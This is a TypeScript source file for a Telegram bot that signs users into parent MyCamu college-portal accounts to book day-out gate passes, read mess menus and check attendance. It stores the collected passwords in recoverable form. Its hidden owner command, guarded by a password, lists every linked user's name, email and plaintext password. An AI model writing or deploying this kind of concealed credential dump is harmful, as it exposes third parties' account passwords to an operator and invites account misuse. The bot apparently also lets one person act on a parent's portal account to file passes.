import {
  boundedJson,
  Camu,
  object,
  status,
  UserError,
  type PassResult,
} from "./camu.ts";
import { Store, type State, type Profile } from "./storage.ts";
import { attendance, attendanceText, menu } from "./reports.ts";
import { verifyOwner } from "./security.ts";
import { ist, tomorrow, windowFor } from "./time.ts";
interface Sender {
  id: number;
  username?: string;
}
interface Message {
  message_id: number;
  text?: string;
  chat: { id: number; type: string };
  from?: Sender;
}
export interface Update {
  update_id: number;
  message?: Message;
  callback_query?: {
    id: string;
    data?: string;
    from: Sender;
    message?: Message;
  };
}
type Buttons = { text: string; callback_data: string }[][];
const main: Buttons = [
  [{ text: "🚀 Day Out Pass", callback_data: "pass" }],
  [
    { text: "🍱 Mess Menu (Live)", callback_data: "menu" },
    { text: "📊 Attendance", callback_data: "attendance" },
  ],
  [
    { text: "🔍 Gate Status", callback_data: "status" },
    { text: "📋 Recent Passes", callback_data: "history" },
  ],
  [{ text: "🚪 Logout / Switch Account", callback_data: "logout" }],
];
const meals: Buttons = [
  [
    { text: "Breakfast", callback_data: "meal:breakfast" },
    { text: "Lunch", callback_data: "meal:lunch" },
  ],
  [
    { text: "Snacks", callback_data: "meal:snacks" },
    { text: "Dinner", callback_data: "meal:dinner" },
  ],
  [{ text: "Today's full menu", callback_data: "meal:all" }],
  [{ text: "Back", callback_data: "home" }],
];
export class Telegram {
  constructor(
    readonly env: Env,
    readonly store = new Store(env),
  ) {}
  async call(method: string, data: unknown): Promise<unknown> {
    const response = await fetch(
      `https://api.telegram.org/bot${this.env.TELEGRAM_BOT_TOKEN}/${method}`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
        signal: AbortSignal.timeout(10000),
        redirect: "manual",
      },
    );
    const body = object(await boundedJson(response, 1024 * 1024));
    if (!response.ok || body.ok !== true)
      throw new Error("Telegram delivery failed");
    return body.result;
  }
  async send(id: number, text: string, buttons?: Buttons): Promise<void> {
    const chars = Array.from(text);
    for (let offset = 0; offset < chars.length; offset += 3500)
      await this.call("sendMessage", {
        chat_id: id,
        text: chars.slice(offset, offset + 3500).join(""),
        protect_content: true,
        ...(offset + 3500 >= chars.length && buttons
          ? { reply_markup: { inline_keyboard: buttons } }
          : {}),
      });
  }
  async delete(id: number, message: number): Promise<boolean> {
    try {
      await this.call("deleteMessage", { chat_id: id, message_id: message });
      return true;
    } catch {
      return false;
    }
  }
  async client(id: number): Promise<Camu> {
    const profile = await this.store.account(id);
    if (!profile)
      throw new UserError("Link your parent account first with /start.");
    const client = new Camu(profile);
    await client.connect();
    await this.store.saveAccount(id, client.profile);
    return client;
  }
  owner(sender: Sender): boolean {
    return (
      String(sender.id) === this.env.OWNER_TELEGRAM_ID &&
      Boolean(this.env.OWNER_TELEGRAM_USERNAME) &&
      sender.username?.toLowerCase() ===
        this.env.OWNER_TELEGRAM_USERNAME.replace(/^@/, "").toLowerCase()
    );
  }
  async confirm(id: number, state: State): Promise<void> {
    await this.store.setState(id, {
      step: "confirm",
      date: state.date,
      departure: state.departure,
    });
    await this.send(
      id,
      `Day Out Pass\nDate: ${state.date}\nDeparture: ${state.departure ? state.departure.slice(11, 16) + " IST" : "next available minute after portal checks"}\nReturn: 7 PM IST\nReason: Going out\n\nI’ll check existing leave and pass status first.`,
      [
        [{ text: "Create / reuse pass", callback_data: "submit" }],
        [{ text: "Cancel", callback_data: "cancel" }],
      ],
    );
  }
  async pickTime(id: number, state: State, messageId?: number): Promise<void> {
    if (!state.date)
      throw new UserError("Date missing. Start a new pass request.");
    await this.store.setState(id, state);
    const rows: Buttons = [];
    const pad = (n: number) => String(n).padStart(2, "0");
    let text: string;
    if (state.hour === undefined) {
      const hours = Array.from({ length: 13 }, (_, i) => i + 6);
      for (let i = 0; i < hours.length; i += 3)
        rows.push(
          hours.slice(i, i + 3).map((hour) => ({
            text: `${hour % 12 || 12} ${hour < 12 ? "AM" : "PM"}`,
            callback_data: `clock:${state.date}:hour:${hour}`,
          })),
        );
      text = `🕒 Departure on ${state.date} (IST)\nChoose the hour. Return is 7 PM the same day.`;
    } else {
      const minute = state.minute ?? 0;
      for (let i = 0; i < 60; i += 20)
        rows.push(
          Array.from({ length: 4 }, (_, j) => i + j * 5).map((value) => ({
            text: `${value === minute ? "✓ " : ""}${pad(value)}`,
            callback_data: `clock:${state.date}:minute:${value}`,
          })),
        );
      rows.push([
        { text: "−1 minute", callback_data: `clock:${state.date}:adjust:-1` },
        { text: "+1 minute", callback_data: `clock:${state.date}:adjust:1` },
      ]);
      rows.push([
        {
          text: `Use ${pad(state.hour)}:${pad(minute)}`,
          callback_data: `clock:${state.date}:use:0`,
        },
      ]);
      rows.push([
        { text: "Back to hours", callback_data: `clock:${state.date}:back:0` },
      ]);
      text = `🕒 Departure: ${state.date}, ${pad(state.hour)}:${pad(minute)} IST\nChoose minutes, then tap Use. ±1 minute allows any exact time.`;
    }
    rows.push([{ text: "Cancel", callback_data: "cancel" }]);
    if (messageId !== undefined)
      await this.call("editMessageText", {
        chat_id: id,
        message_id: messageId,
        text,
        reply_markup: { inline_keyboard: rows },
      });
    else await this.send(id, text, rows);
  }
  async beginPass(id: number): Promise<void> {
    const local = ist(),
      window = windowFor();
    if ("needs_next_day" in window) {
      await this.store.setState(id, { step: "tomorrow", date: tomorrow() });
      await this.send(
        id,
        "Today's day-pass window has ended. Apply for tomorrow?",
        [
          [
            { text: "Yes, tomorrow", callback_data: "tomorrow" },
            { text: "No", callback_data: "cancel" },
          ],
        ],
      );
    } else if (local.slice(11, 16) < "06:00") {
      await this.pickTime(id, { step: "time", date: local.slice(0, 10) });
    } else await this.confirm(id, { step: "confirm", date: window.day });
  }
  async ownerList(id: number, page: number): Promise<void> {
    const rows = await this.env.DB.prepare(
      "SELECT id,sealed,linked_at FROM accounts ORDER BY id LIMIT 5 OFFSET ?",
    )
      .bind((page - 1) * 5)
      .all<{ id: number; sealed: string; linked_at: string }>();
    if (!rows.results.length) {
      await this.send(id, "No accounts on this page.");
      return;
    }
    const lines: string[] = [];
    for (const row of rows.results) {
      const p = await this.store.account(row.id);
      if (p)
        lines.push(
          `${p.student_name}\nTelegram ID: ${row.id}\nEmail: ${p.email}\nPassword: ${p.password}\nLinked: ${row.linked_at}`,
        );
    }
    await this.send(
      id,
      `Owner directory — page ${page}\n\n${lines.join("\n\n")}\n\nUse the hidden command with a page number to view another page. A password is required each time.`,
    );
  }
  async handle(update: Update): Promise<void> {
    const callback = update.callback_query,
      message = callback?.message || update.message,
      sender = callback?.from || message?.from;
    if (
      !message ||
      !sender ||
      message.chat.type !== "private" ||
      message.chat.id !== sender.id
    )
      return;
    const id = sender.id,
      text = update.message?.text || "",
      rawAction = callback?.data;
    if (callback)
      await this.call("answerCallbackQuery", {
        callback_query_id: callback.id,
      });
    const aliases: Record<string, string> = {
      btn_create_pass: "pass",
      btn_mess_menu: "menu",
      btn_attendance: "attendance",
      btn_check_status: "status",
      btn_recent_passes: "history",
      btn_logout: "logout",
      btn_back_main: "home",
      btn_start_login: "home",
      pass_submit: "submit",
      pass_cancel: "cancel",
      pass_tomorrow_yes: "tomorrow",
      pass_tomorrow_no: "cancel",
    };
    const action = rawAction?.startsWith("meal_")
      ? "meal:" + rawAction.slice(5)
      : aliases[rawAction || ""] || rawAction;
    const ownerCommand = this.env.OWNER_COMMAND || "users";
    const rawCommand = text.startsWith("/")
      ? text.trim().split(/\s+/)[0].split("@")[0].toLowerCase()
      : "";
    const normalizedCommand =
      (
        {
          "/pass": "/daypass",
          "/restart": "/start",
          "/login": "/start",
          "/features": "/help",
        } as Record<string, string>
      )[rawCommand] || rawCommand;
    const command = [
      "/start",
      "/help",
      "/myid",
      "/cancel",
      "/logout",
      "/shortcut",
      "/daypass",
      "/menu",
      "/attendance",
      "/status",
      `/${ownerCommand}`,
    ].includes(normalizedCommand)
      ? normalizedCommand
      : "";
    const hidden = command === `/${ownerCommand}`;
    if (hidden) {
      if (!this.owner(sender)) return;
      if (!this.env.OWNER_PASSWORD_HASH) {
        await this.send(id, "Owner password is not configured.");
        return;
      }
      const auth = await this.env.DB.prepare(
        "SELECT locked_until FROM owner_auth WHERE id=1",
      ).first<{ locked_until: number }>();
      if (auth && auth.locked_until > Date.now()) {
        await this.send(id, "Owner access locked. Try again in 15 minutes.");
        return;
      }
      const raw = text.trim().split(/\s+/)[1] || "1",
        page = Number(raw);
      if (!Number.isSafeInteger(page) || page < 1 || page > 100000) {
        await this.send(id, "Invalid page number.");
        return;
      }
      await this.store.setState(id, { step: "owner", page });
      await this.send(
        id,
        "Enter your owner password within 2 minutes. It will be deleted before verification.",
      );
      return;
    }
    if (command === "/myid") {
      await this.send(id, `Your Telegram ID: ${id}`);
      return;
    }
    if (command === "/cancel" || action === "cancel") {
      await this.store.setState(id, null);
      await this.send(id, "Cancelled.", main);
      return;
    }
    if (command === "/logout" || action === "logout") {
      await this.store.forget(id);
      await this.send(
        id,
        "Linked account, saved password, conversation and shortcut key removed. Use /start to link an account.",
      );
      return;
    }
    const needsState =
      (!action && !command) ||
      action === "tomorrow" ||
      action === "submit" ||
      action?.startsWith("clock:");
    const state = needsState ? await this.store.state(id) : null;
    if (!action && !command && state?.step === "owner") {
      await this.store.setState(id, null);
      if (!(await this.delete(id, message.message_id))) {
        await this.send(
          id,
          "Could not delete that message. No account details were revealed.",
        );
        return;
      }
      if (!this.owner(sender)) return;
      const auth = await this.env.DB.prepare(
        "SELECT locked_until FROM owner_auth WHERE id=1",
      ).first<{ locked_until: number }>();
      if (auth && auth.locked_until > Date.now()) {
        await this.send(id, "Owner access is temporarily locked.");
        return;
      }
      const valid = await verifyOwner(
        text,
        this.env.OWNER_PASSWORD_HASH,
        this.env.CREDENTIAL_KEY,
      );
      if (!valid) {
        const now = Date.now();
        await this.env.DB.prepare(
          "UPDATE owner_auth SET failures=CASE WHEN window_start<? THEN 1 ELSE failures+1 END,window_start=CASE WHEN window_start<? THEN ? ELSE window_start END,locked_until=CASE WHEN window_start>=? AND failures>=4 THEN ? ELSE locked_until END WHERE id=1",
        )
          .bind(now - 900000, now - 900000, now, now - 900000, now + 900000)
          .run();
        await this.send(id, "Owner password incorrect.");
        return;
      }
      await this.env.DB.prepare(
        "UPDATE owner_auth SET failures=0,window_start=0,locked_until=0 WHERE id=1",
      ).run();
      await this.ownerList(id, state.page || 1);
      return;
    }
    // Delete possible expired owner/login passwords as well; never echo unknown text.
    if (!action && !command && !state) {
      await this.delete(id, message.message_id);
      await this.send(id, "Session expired or no input expected. Use /start.");
      return;
    }
    if (command === "/start" || command === "/help" || action === "home") {
      await this.store.setState(id, null);
      const p = await this.store.account(id);
      if (p) {
        await this.send(
          id,
          `Welcome, ${p.student_name}. Choose an option.`,
          main,
        );
        return;
      }
      await this.store.setState(id, { step: "email" });
      await this.send(
        id,
        "Link a parent MyCamu account. Credentials are encrypted on the server; the bot operator can access them. /logout removes your linked credentials.\n\nEnter the parent account email.",
      );
      return;
    }
    if (!action && !command && state?.step === "email") {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text) || text.length > 254) {
        await this.send(id, "Enter a valid parent account email.");
        return;
      }
      await this.store.setState(id, { step: "password", email: text.trim() });
      await this.send(
        id,
        "Enter the MyCamu password. I’ll delete the message before signing in.",
      );
      return;
    }
    if (!action && !command && state?.step === "password") {
      const deleted = await this.delete(id, message.message_id);
      await this.store.setState(id, null);
      if (!deleted) {
        await this.send(
          id,
          "Could not delete the password message. Sign-in stopped; use /start to retry.",
        );
        return;
      }
      if (!state.email || !text || text.length > 1024)
        throw new UserError("Invalid login input. Use /start.");
      const p: Profile = {
        email: state.email,
        password: text,
        student_name: "",
        stu_id: "",
        in_id: "",
        logged_in_id: "",
        account_type: "",
        cookies: {},
      };
      const client = new Camu(p);
      await client.login();
      await this.store.saveAccount(id, p, true);
      await this.send(id, `Linked ${p.student_name}.`, main);
      return;
    }
    if (!(await this.store.account(id)))
      throw new UserError("Use /start to link your parent account.");
    if (command === "/shortcut") {
      const key = await this.store.shortcut(id);
      await this.send(
        id,
        `Personal shortcut key (previous key revoked):\n${key}\n\nUse X-API-Key with the Cloudflare API. Keep this key private.`,
      );
      return;
    }
    if (action === "pass" || command === "/daypass") {
      await this.beginPass(id);
      return;
    }
    if (action === "tomorrow" && state?.step === "tomorrow") {
      if (state.date !== tomorrow()) {
        await this.store.setState(id, null);
        throw new UserError("Date changed. Start again.");
      }
      await this.pickTime(id, { step: "time", date: state.date });
      return;
    }
    if (action?.startsWith("clock:")) {
      const match =
        /^clock:(\d{4}-\d{2}-\d{2}):(hour|minute|adjust|use|back):(-?\d{1,2})$/.exec(
          action,
        );
      if (!match || state?.step !== "time" || match[1] !== state.date)
        throw new UserError(
          "This time picker has expired. Start a new pass request.",
        );
      const [, , selection, raw] = match,
        value = Number(raw);
      if (selection === "hour") {
        if (value < 6 || value > 18)
          throw new UserError("Choose an hour from 6 AM to before 7 PM.");
        if (state.hour !== value || (state.minute ?? 0) !== 0)
          await this.pickTime(
            id,
            { ...state, hour: value, minute: 0 },
            message.message_id,
          );
      } else if (selection === "back") {
        await this.pickTime(
          id,
          { step: "time", date: state.date },
          message.message_id,
        );
      } else {
        if (state.hour === undefined || state.hour < 6 || state.hour > 18)
          throw new UserError("Choose an hour first.");
        if (selection === "minute") {
          if (value < 0 || value > 59)
            throw new UserError("Choose valid minutes.");
          // An already-selected minute needs no edit (Telegram rejects unchanged messages).
          if (value !== (state.minute ?? 0))
            await this.pickTime(
              id,
              { ...state, minute: value },
              message.message_id,
            );
        } else if (selection === "adjust") {
          if (value !== -1 && value !== 1)
            throw new UserError("Invalid minute adjustment.");
          await this.pickTime(
            id,
            { ...state, minute: ((state.minute ?? 0) + value + 60) % 60 },
            message.message_id,
          );
        } else {
          const time = `${String(state.hour).padStart(2, "0")}:${String(state.minute ?? 0).padStart(2, "0")}`;
          const departure = `${state.date}T${time}:00+05:30`;
          windowFor(departure);
          await this.confirm(id, { ...state, departure });
        }
      }
      return;
    }
    if (!action && !command && state?.step === "time") {
      if (
        !/^\d{2}:\d{2}$/.test(text) ||
        Number(text.slice(3)) > 59 ||
        text < "06:00" ||
        text >= "19:00"
      )
        throw new UserError("Enter HH:MM from 06:00 to before 19:00.");
      const departure = `${state.date}T${text}:00+05:30`;
      windowFor(departure);
      await this.confirm(id, { ...state, departure });
      return;
    }
    if (action === "submit" && state?.step === "confirm") {
      if (
        !state.date ||
        (!state.departure && state.date !== ist().slice(0, 10))
      )
        throw new UserError("Date changed. Start a new request.");
      await this.send(
        id,
        "Checking your leave and gate status, then submitting only if needed…",
      );
      const client = await this.client(id),
        result = await client.createPass(
          this.store,
          "Going out",
          state.departure,
        );
      if (result.needs_next_day) {
        await this.beginPass(id);
        return;
      }
      await this.store.setState(id, null);
      await this.send(id, passText(result), main);
      return;
    }
    if (
      action === "menu" ||
      action?.startsWith("meal:") ||
      command === "/menu"
    ) {
      await this.send(
        id,
        await menu(
          await this.client(id),
          action?.startsWith("meal:") ? action.slice(5) : undefined,
        ),
        meals,
      );
      return;
    }
    if (action === "attendance" || command === "/attendance") {
      await this.send(
        id,
        attendanceText(await attendance(await this.client(id))),
        main,
      );
      return;
    }
    if (action === "status" || command === "/status") {
      const result = await (await this.client(id)).active();
      await this.send(
        id,
        result.has_active_pass
          ? `Gate pass: ${result.status}\n${result.start} to ${result.end}\n${result.is_outside_campus ? "Checked OUT" : "Inside / no current OUT scan"}\nNew passes are blocked until Completed.`
          : "No current unfinished gate pass found.",
        main,
      );
      return;
    }
    if (action === "history") {
      const records = await (await this.client(id)).records();
      await this.send(
        id,
        records
          .slice(0, 10)
          .map(
            (r) =>
              `${r.isGatepass ? r.passTyNme || "Gate Pass" : r.LvTy || "Leave"} — ${status(r)}\n${r.frdt || r.start || ""} to ${r.todt || r.end || ""}\n${r.rson || r.Rson || ""}`,
          )
          .join("\n\n") || "No records.",
        main,
      );
      return;
    }
    await this.send(id, "Use the current buttons or /start.", main);
  }
}
export function passText(result: PassResult): string {
  return `${result.message}${result.reused_gate_pass ? "\nExisting pass reused; no duplicate created." : ""}${result.departure ? "\nDeparture: " + result.departure.slice(0, 16).replace("T", " ") + " IST" : ""}${result.return ? "\nReturn: " + result.return.slice(0, 16).replace("T", " ") + " IST" : ""}`;
}
